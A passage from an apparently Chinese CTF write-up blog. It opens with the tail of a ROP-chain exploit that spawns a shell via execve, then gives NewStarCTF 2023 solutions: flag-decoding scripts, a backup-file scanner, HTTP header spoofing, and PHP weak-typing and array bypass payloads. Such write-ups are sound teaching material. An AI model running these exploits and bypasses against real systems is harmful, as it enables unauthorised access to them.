<span class="number">0x0000000000419a1c</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041ac41</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000417e25</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041ac41</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401d1d</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a30d</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401858</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000049d0c8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000417e25</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401243</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">pl.sendline(p)</span><br><span class="line"></span><br><span class="line">pl.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="WEEK1-babystack"><a href="#WEEK1-babystack" class="headerlink" title="[WEEK1]babystack"></a>[WEEK1]babystack</h3>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-newstarctf" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/09/25/newstarctf/" class="article-date">
  	<time datetime="2023-09-25T03:01:20.000Z" itemprop="datePublished">2023-09-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/09/25/newstarctf/">
        newstarctf
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string=<span class="string">&quot;V\QWkt $_e&#x27;^_ggXQ&#x27;u|v!c/m&quot;</span></span><br><span class="line">string=<span class="built_in">list</span>(string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">  string[i]=<span class="built_in">ord</span>(string[i])-<span class="number">16</span>^<span class="number">0x20</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">chr</span>(string[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="咳"><a href="#咳" class="headerlink" title="咳"></a>咳</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string=<span class="string">&quot;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&quot;</span></span><br><span class="line">string=<span class="built_in">list</span>(string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">  string[i]=<span class="built_in">ord</span>(string[i])-<span class="number">1</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">chr</span>(string[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h3><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.230oqvgvsl0g.png"></p>
<p>flag{You_ar3_g0od_at_f1nding_ELF_segments_name}</p>
<h3 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">14</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">11</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>]</span><br><span class="line">ascii_values = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, <span class="built_in">int</span>):</span><br><span class="line">        ascii_values.append(item)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ascii_values.append(<span class="built_in">ord</span>(item))</span><br><span class="line"></span><br><span class="line">string2 = <span class="string">&quot;happyx3&quot;</span></span><br><span class="line">string2 = <span class="built_in">list</span>(string2)</span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ascii_values)):</span><br><span class="line">    char_code = ascii_values[i] ^ <span class="built_in">ord</span>(string2[i % <span class="built_in">len</span>(string2)])</span><br><span class="line">    result.append(<span class="built_in">chr</span>(char_code))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(result))</span><br></pre></td></tr></table></figure>

<h3 id="EzPE"><a href="#EzPE" class="headerlink" title="EzPE"></a>EzPE</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x1F</span>, <span class="number">0x26</span>, <span class="number">0x6C</span>, <span class="number">0x43</span>, <span class="number">0x2D</span>, <span class="number">0x3C</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0x4C</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>, </span><br><span class="line">  <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x36</span>, <span class="number">0x1F</span>, <span class="number">0x12</span>, <span class="number">0x26</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x68</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x2D</span>, <span class="number">0x37</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data) - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    data[i] = data[i] ^ i ^ data[i+<span class="number">1</span>]</span><br><span class="line">    result += <span class="built_in">chr</span>(data[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">   <span class="built_in">print</span>(result[j],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://9d41a563-79e3-4f30-a3d4-61e6e3246ede.node4.buuoj.cn:81&quot;</span></span><br><span class="line"></span><br><span class="line">li1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line">li2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url + <span class="string">&quot;/&quot;</span> + i + <span class="string">&quot;.&quot;</span> + j</span><br><span class="line">        r = requests.get(url_final)</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<p>通过脚本，扫描网站可以泄露的东西，最后发现是<a target="_blank" rel="noopener" href="http://www.zip,直接在网站最后加上,就可以下载一个www.zip,里面就包含了flag/">www.zip，直接在网站最后加上，就可以下载一个www.zip，里面就包含了flag</a></p>
<h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>抓包</p>
<h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><ul>
<li><p><strong>考点</strong>：Flask报错界面信息泄露</p>
</li>
<li><p><strong>FLAG</strong>：动态FLAG</p>
</li>
<li><p><strong>解题步骤</strong></p>
</li>
</ul>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4llww5xoavc0.webp" alt="image"></p>
<p>提示输入number1和number2，我们随便给其中一个传入数组就会发现</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4z413itworc0.webp" alt="image"></p>
<p>成功获取flag</p>
<h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><ul>
<li><p><strong>考点</strong>：HTTP常见请求头、HTTP请求方式</p>
</li>
<li><p><strong>FLAG</strong>：动态FLAG</p>
</li>
<li><p><strong>解题步骤</strong></p>
</li>
</ul>
<p>进入题目首先要求以GET方式传参：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://ec7fe482-428e-4978-8b2c-4016472b07a7.node4.buuoj.cn:81/index.php?ctf=ok">http://ec7fe482-428e-4978-8b2c-4016472b07a7.node4.buuoj.cn:81/index.php?ctf=ok</a></p>
</blockquote>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6u94htzuxh00.webp" alt="image"></p>
<p>右键查看页面源代码可以看到base64编码后的secret值：</p>
<p>base64解码得到</p>
<blockquote>
<p>n3wst4rCTF2023g00000d</p>
</blockquote>
<p>使用HackBar发送secret：</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6qq7ddqswc40.webp" alt="image"></p>
<p>接着题目要求power为ctfer，使用Burp Suite抓包修改Cookie值：</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.555xj0hd2z40.webp" alt="image"></p>
<p>接着修改U-A头为NewStarCTF2023：</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7a5ebded1ug0.webp" alt="image"></p>
<p>修改Referer头为newstarctf.com：</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5yp1p5qib800.webp" alt="image"></p>
<p>添加X-Real-IP头，值为127.0.0.1，获得Flag：</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2zgrkm49clg0.webp" alt="image"></p>
<h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><ul>
<li><p><strong>考点</strong>：PHP弱类型、PHP加密函数数组绕过、PHP函数特性、变量覆盖漏洞</p>
</li>
<li><p><strong>FLAG</strong>：动态FLAG</p>
</li>
<li><p><strong>解题步骤</strong></p>
</li>
</ul>
<p>题目分为五个关卡。</p>
<p>第一关主要考察PHP中md5弱类型比较的特点，只需要找到两个值不同但md5值以0e开头的字符串即可通过本关，原理是0e在进行弱类型比较时会被当作科学计数法进行比较。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;    <span class="keyword">echo</span> <span class="string">&quot;=Level 1&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$flag1 </span>= True;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>构造Payload如下：</p>
<p>key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708</p>
<p>第二关主要考察PHP哈希函数的特性，在处理数组类型的传参时，md5、sha1等哈希函数会返回NULL值，由此可以构造出NULL&#x3D;&#x3D;&#x3D;NULL从而通过判断。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$flag2 </span>= True;</span><br><span class="line">       &#125;    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;        </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>); </span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708</p>
</blockquote>
<blockquote>
<p>POST-DATA: key3[]&#x3D;1</p>
</blockquote>
<p>第三关主要考察strcmp函数特性，如果传入的参数为数组类型，该函数就会返回NULL值，构造NULL&#x3D;&#x3D;0从而通过判断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&quot;</span>;</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">  <span class="variable">$flag3</span> = True;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造Payload如下：</p>
<blockquote>
<p>key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;2</p>
<p>POST-DATA: key3[]&#x3D;1</p>
</blockquote>
<p>第四关主要考察is_numeric函数特性，在传入的数字后加入任意字母即可通过本层的判断。</p>
